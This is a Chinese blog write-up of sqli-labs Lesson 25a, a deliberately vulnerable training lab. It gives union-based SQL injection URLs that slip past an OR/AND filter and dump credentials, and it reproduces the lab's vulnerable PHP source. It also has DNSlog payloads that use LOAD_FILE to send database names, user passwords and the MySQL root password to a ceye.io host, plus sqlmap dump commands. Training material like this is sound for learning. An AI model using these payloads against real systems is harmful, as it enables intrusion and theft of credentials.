---
title: sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有
date: 2018-10-04 16:09:52
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession 25a GET基于盲注整型单引号-你的OR及AND归我所有

---

## 登录界面

![001](/img/sql/Lesson-25a/001.png)

## 手注(BUG?)

这里和Lesson-25的过滤没有区别,只不过没法利用报错注入了。试一试能不能直接返回数据。

`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,database(),3%23`

![002](/img/sql/Lesson-25a/002.png)

`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())%23`

![003](/img/sql/Lesson-25a/003.png)

中间一样的,直接获取字段值吧。

`http://192.168.75.132/sql/Less-25a/?id=-1 union select 1,(select group_concat(username,':',passwoorrd) from users),3%23`

![004](/img/sql/Lesson-25a/004.png)

恩...题目不是盲注吗,是不是我把源码动过了,修改源码中的php源码并保存。

修改地方：

```
<?php
error_reporting(0);
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");


// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

	//fiddling with comments
	$id= blacklist($id);
	//echo "<br>";
	//echo $id;
	//echo "<br>";
	$hint=$id;

// connectivity 
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  		echo "<font size='5' color= '#99FF00'>";	
	  	//echo 'Your Login name:'. $row['username'];
		echo 'YOU ARE IN ........';	  	
		echo "<br>";
	  	//echo 'Your Password:' .$row['password'];
	  	echo "</font>";
  	}
	else 
	{
		echo '<font size="5" color="#FFFF00">';
		echo 'You are in...........';
		//print_r(mysql_error());
		//echo "You have an error in your SQL syntax";
		echo "</br></font>";	
		echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else 
{ 
	echo "Please input the ID as parameter with numeric value";
}

function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}



?>

```

现在正确只显示`YOU ARE IN ........`,错误显示`You are in...........`

## 盲注

这里可以写通过根据错误的回显不同编写脚本来提高忙注的效率。

## DNSlog

上面这样的布尔型盲注即使使用二分法也需要一些的时间,编写脚本又觉得费力,怎么办,试试DNSlog。

```
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'))
```

上面这个是一个mysql数据库的DNSlog注入的payload。访问的是mysql.ip.port.b182oj.ceye.io下的abc资源,资源名可以任意填，目的只是让目标在该DNS解析上留下记录。

需要了解的是能通过load_file函数发送DNS请求。通过该函数发送数据给某个url,会在DNS服务器上留下DNS解析的记录,通过查询这个记录就能够获得想要的信息。具体操作一遍就没那么复杂了。

现在http://ceye.io 注册一个账号。获得自己的二级域名,类似于abcdef.ceye.io之类的。

### 获取字段数

`http://192.168.75.133/sql/Less-25a/?id=1 union select 1,2,3%23`

已经测试出了字段数,在对应位置填写payload。

如果不成功,确认Mysql配置文件`my.ini`下存在`secure-file-priv`,并且没被注释

### 获取当前数据库

`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\',(select database()),'.你的域名.ceye.io\\abc'))),3%23`

![005](/img/sql/Lesson-25a/005.png)

### 获取表名

load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析

`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\',(select table_name from infoorrmation_schema.tables where table_schema='security' limit 3,1),'.你的域名.ceye.io\\abc'))),3%23`

![006](/img/sql/Lesson-25a/006.png)

### 获取列名

`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\',(select column_name from infoorrmation_schema.columns where table_name='users' limit 2,1),'.你的域名.ceye.io\\abc'))),3%23`

### 获取字段

![007](/img/sql/Lesson-25a/007.png)

`http://10.60.250.250/sql/Less-25a/?id=1 union select 1,(select load_file(concat('\\\\',(select concat(username,'_',passwoorrd) from users limit 1,1),'.你的域名.ceye.io\\abc'))),3%23`

![008](/img/sql/Lesson-25a/008.png)

## SQLMAP

还是使用上一课写的绕过or和and的脚本。

```
--dbsm msql:指定后端数据库为mysql
--technique T:指定注入方式为时间注入
--threads 10:指定并发线程数为10
--tamper andor.py:payload中的and用anandd or用oorr替代
```

`python sqlmap.py -u "http://10.60.250.250/sql/Less-25a/?id=1" --dbms mysql --technique T --threads 10 --tamper "andor.py" `

![009](/img/sql/Lesson-25a/009.png)

`python sqlmap.py -u "http://10.60.250.250/sql/Less-25a/?id=1" --dbms mysql --technique T --threads 10 --tamper "andor.py" -D security -T users --columns --dump`

![010](/img/sql/Lesson-25a/010.png)

